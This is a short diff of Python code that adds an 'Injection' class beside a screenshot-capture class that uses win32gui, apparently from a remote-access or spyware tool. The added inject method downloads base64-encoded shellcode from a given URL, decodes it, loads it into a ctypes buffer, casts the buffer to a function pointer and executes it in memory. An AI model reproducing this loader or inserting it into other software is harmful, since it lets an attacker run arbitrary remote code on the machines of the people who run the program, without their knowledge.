@@ -136,7 +136,16 @@ class SSManager(object):
         win32gui.DeleteObject(screenshot.GetHandle())
 
 
-
+class Injection(object):
+    def inject(self, shellcode_url):
+        import urllib2
+        import ctypes
+        import base64
+        response = urllib2.urlopen(shellcode_url)
+        shellcode = base64.b64decode(response.read())
+        shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
+        shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
+        shellcode_func()
 
 
 def main():
